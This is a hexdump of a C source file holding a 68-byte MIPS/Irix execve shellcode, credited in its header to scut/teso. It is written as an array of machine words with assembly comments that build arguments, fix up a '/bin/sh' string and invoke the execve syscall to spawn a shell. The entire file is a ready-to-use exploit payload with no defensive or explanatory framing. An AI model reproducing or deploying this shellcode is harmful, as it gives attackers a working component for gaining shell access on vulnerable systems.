00000000  2f 2a 20 36 38 20 62 79  74 65 20 4d 49 50 53 2f  |/* 68 byte MIPS/|
00000010  49 72 69 78 20 50 49 43  20 65 78 65 63 76 65 20  |Irix PIC execve |
00000020  73 68 65 6c 6c 63 6f 64  65 2e 20 2d 73 63 75 74  |shellcode. -scut|
00000030  2f 74 65 73 6f 0d 0a 20  2a 2f 0d 0a 75 6e 73 69  |/teso.. */..unsi|
00000040  67 6e 65 64 20 6c 6f 6e  67 20 69 6e 74 20 73 68  |gned long int sh|
00000050  65 6c 6c 63 6f 64 65 5b  5d 20 3d 20 7b 0d 0a 20  |ellcode[] = {.. |
00000060  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 30  |               0|
00000070  78 61 66 61 30 66 66 66  63 2c 20 20 20 20 20 2f  |xafa0fffc,     /|
00000080  2a 20 73 77 20 20 20 20  20 20 20 20 20 20 20 24  |* sw           $|
00000090  7a 65 72 6f 2c 20 2d 34  28 24 73 70 29 20 20 20  |zero, -4($sp)   |
000000a0  20 20 20 20 20 20 20 2a  2f 0d 0a 20 20 20 20 20  |       */..     |
000000b0  20 20 20 20 20 20 20 20  20 20 20 30 78 32 34 30  |           0x240|
000000c0  36 37 33 35 30 2c 20 20  20 20 20 2f 2a 20 6c 69  |67350,     /* li|
000000d0  20 20 20 20 20 20 20 20  20 20 20 24 61 32 2c 20  |           $a2, |
000000e0  30 78 37 33 35 30 20 20  20 20 20 20 20 20 20 20  |0x7350          |
000000f0  20 20 20 2a 2f 0d 0a 2f  2a 20 64 70 61 74 63 68  |   */../* dpatch|
00000100  3a 20 2a 2f 20 20 20 30  78 30 34 64 30 66 66 66  |: */   0x04d0fff|
00000110  66 2c 20 20 20 20 20 2f  2a 20 62 6c 74 7a 61 6c  |f,     /* bltzal|
00000120  20 20 20 20 20 20 20 24  61 32 2c 20 64 70 61 74  |       $a2, dpat|
00000130  63 68 20 20 20 20 20 20  20 20 20 20 20 20 20 2a  |ch             *|
00000140  2f 0d 0a 20 20 20 20 20  20 20 20 20 20 20 20 20  |/..             |
00000150  20 20 20 30 78 38 66 61  36 66 66 66 63 2c 20 20  |   0x8fa6fffc,  |
00000160  20 20 20 2f 2a 20 6c 77  20 20 20 20 20 20 20 20  |   /* lw        |
00000170  20 20 20 24 61 32 2c 20  2d 34 28 24 73 70 29 20  |   $a2, -4($sp) |
00000180  20 20 20 20 20 20 20 20  20 20 20 2a 2f 0d 0a 20  |           */.. |
00000190  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 2f  |               /|
000001a0  2a 20 61 32 20 3d 20 28  63 68 61 72 20 2a 2a 29  |* a2 = (char **)|
000001b0  20 65 6e 76 70 20 3d 20  4e 55 4c 4c 20 2a 2f 0d  | envp = NULL */.|
000001c0  0a 0d 0a 20 20 20 20 20  20 20 20 20 20 20 20 20  |...             |
000001d0  20 20 20 30 78 32 34 30  66 66 66 63 62 2c 20 20  |   0x240fffcb,  |
000001e0  20 20 20 2f 2a 20 6c 69  20 20 20 20 20 20 20 20  |   /* li        |
000001f0  20 20 20 24 74 37 2c 20  2d 35 33 20 20 20 20 20  |   $t7, -53     |
00000200  20 20 20 20 20 20 20 20  20 20 20 2a 2f 0d 0a 20  |           */.. |
00000210  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 30  |               0|
00000220  78 30 31 65 30 37 38 32  37 2c 20 20 20 20 20 2f  |x01e07827,     /|
00000230  2a 20 6e 6f 72 20 20 20  20 20 20 20 20 20 20 24  |* nor          $|
00000240  74 37 2c 20 24 74 37 2c  20 24 7a 65 72 6f 20 20  |t7, $t7, $zero  |
00000250  20 20 20 20 20 20 20 2a  2f 0d 0a 20 20 20 20 20  |       */..     |
00000260  20 20 20 20 20 20 20 20  20 20 20 30 78 30 33 65  |           0x03e|
00000270  66 66 38 32 31 2c 20 20  20 20 20 2f 2a 20 61 64  |ff821,     /* ad|
00000280  64 75 20 20 20 20 20 20  20 20 20 24 72 61 2c 20  |du         $ra, |
00000290  24 72 61 2c 20 24 74 37  20 20 20 20 20 20 20 20  |$ra, $t7        |
000002a0  20 20 20 2a 2f 0d 0a 0d  0a 20 20 20 20 20 20 20  |   */....       |
000002b0  20 20 20 20 20 20 20 20  20 2f 2a 20 61 30 20 3d  |         /* a0 =|
000002c0  20 28 63 68 61 72 20 2a  29 20 70 61 74 68 6e 61  | (char *) pathna|
000002d0  6d 65 20 2a 2f 0d 0a 20  20 20 20 20 20 20 20 20  |me */..         |
000002e0  20 20 20 20 20 20 20 30  78 32 33 65 34 66 66 66  |       0x23e4fff|
000002f0  38 2c 20 20 20 20 20 2f  2a 20 61 64 64 69 20 20  |8,     /* addi  |
00000300  20 20 20 20 20 20 20 24  61 30 2c 20 24 72 61 2c  |       $a0, $ra,|
00000310  20 2d 38 20 20 20 20 20  20 20 20 20 20 20 20 2a  | -8            *|
00000320  2f 0d 0a 0d 0a 20 20 20  20 20 20 20 20 20 20 20  |/....           |
00000330  20 20 20 20 20 2f 2a 20  66 69 78 20 30 78 34 32  |     /* fix 0x42|
00000340  20 64 75 6d 6d 79 20 62  79 74 65 20 69 6e 20 70  | dummy byte in p|
00000350  61 74 68 6e 61 6d 65 20  74 6f 20 73 68 65 6c 6c  |athname to shell|
00000360  20 2a 2f 0d 0a 20 20 20  20 20 20 20 20 20 20 20  | */..           |
00000370  20 20 20 20 20 30 78 38  66 65 64 66 66 66 63 2c  |     0x8fedfffc,|
00000380  20 20 20 20 20 2f 2a 20  6c 77 20 20 20 20 20 20  |     /* lw      |
00000390  20 20 20 20 20 24 74 35  2c 20 2d 34 28 24 72 61  |     $t5, -4($ra|
000003a0  29 20 20 20 20 20 20 20  20 20 20 20 20 2a 2f 0d  |)            */.|
000003b0  0a 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |.               |
000003c0  20 30 78 32 35 61 64 66  66 62 65 2c 20 20 20 20  | 0x25adffbe,    |
000003d0  20 2f 2a 20 61 64 64 69  75 20 20 20 20 20 20 20  | /* addiu       |
000003e0  20 24 74 35 2c 20 24 74  35 2c 20 2d 36 36 20 20  | $t5, $t5, -66  |
000003f0  20 20 20 20 20 20 20 20  20 2a 2f 0d 0a 20 20 20  |         */..   |
00000400  20 20 20 20 20 20 20 20  20 20 20 20 20 30 78 61  |             0xa|
00000410  66 65 64 66 66 66 63 2c  20 20 20 20 20 2f 2a 20  |fedfffc,     /* |
00000420  73 77 20 20 20 20 20 20  20 20 20 20 20 24 74 35  |sw           $t5|
00000430  2c 20 2d 34 28 24 72 61  29 20 20 20 20 20 20 20  |, -4($ra)       |
00000440  20 20 20 20 20 2a 2f 0d  0a 0d 0a 20 20 20 20 20  |     */....     |
00000450  20 20 20 20 20 20 20 20  20 20 20 2f 2a 20 61 31  |           /* a1|
00000460  20 3d 20 28 63 68 61 72  20 2a 2a 29 20 61 72 67  | = (char **) arg|
00000470  76 20 2a 2f 0d 0a 20 20  20 20 20 20 20 20 20 20  |v */..          |
00000480  20 20 20 20 20 20 30 78  61 66 61 34 66 66 66 38  |      0xafa4fff8|
00000490  2c 20 20 20 20 20 2f 2a  20 73 77 20 20 20 20 20  |,     /* sw     |
000004a0  20 20 20 20 20 20 24 61  30 2c 20 2d 38 28 24 73  |      $a0, -8($s|
000004b0  70 29 20 20 20 20 20 20  20 20 20 20 20 20 2a 2f  |p)            */|
000004c0  0d 0a 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |..              |
000004d0  20 20 30 78 32 37 61 35  66 66 66 38 2c 20 20 20  |  0x27a5fff8,   |
000004e0  20 20 2f 2a 20 61 64 64  69 75 20 20 20 20 20 20  |  /* addiu      |
000004f0  20 20 24 61 31 2c 20 24  73 70 2c 20 2d 38 20 20  |  $a1, $sp, -8  |
00000500  20 20 20 20 20 20 20 20  20 20 2a 2f 0d 0a 0d 0a  |          */....|
00000510  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000520  30 78 32 34 30 32 30 34  32 33 2c 20 20 20 20 20  |0x24020423,     |
00000530  2f 2a 20 6c 69 20 20 20  20 20 20 20 20 20 20 20  |/* li           |
00000540  24 76 30 2c 20 31 30 35  39 20 28 53 59 53 5f 65  |$v0, 1059 (SYS_e|
00000550  78 65 63 76 65 29 20 20  2a 2f 0d 0a 20 20 20 20  |xecve)  */..    |
00000560  20 20 20 20 20 20 20 20  20 20 20 20 30 78 30 31  |            0x01|
00000570  30 31 30 31 30 63 2c 20  20 20 20 20 2f 2a 20 73  |01010c,     /* s|
00000580  79 73 63 61 6c 6c 20 20  20 20 20 20 20 20 20 20  |yscall          |
00000590  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000005a0  20 20 20 20 2a 2f 0d 0a  20 20 20 20 20 20 20 20  |    */..        |
000005b0  20 20 20 20 20 20 20 20  30 78 32 66 36 32 36 39  |        0x2f6269|
000005c0  36 65 2c 20 20 20 20 20  2f 2a 20 2e 61 73 63 69  |6e,     /* .asci|
000005d0  69 20 20 20 20 20 20 20  22 2f 62 69 6e 22 20 20  |i       "/bin"  |
000005e0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000005f0  2a 2f 0d 0a 20 20 20 20  20 20 20 20 20 20 20 20  |*/..            |
00000600  20 20 20 20 30 78 32 66  37 33 36 38 34 32 2c 20  |    0x2f736842, |
00000610  20 20 20 20 2f 2a 20 2e  61 73 63 69 69 20 20 20  |    /* .ascii   |
00000620  20 20 20 20 22 2f 73 68  22 2c 20 2e 62 79 74 65  |    "/sh", .byte|
00000630  20 30 78 64 75 6d 6d 79  20 20 20 20 2a 2f        | 0xdummy    */|
0000063e
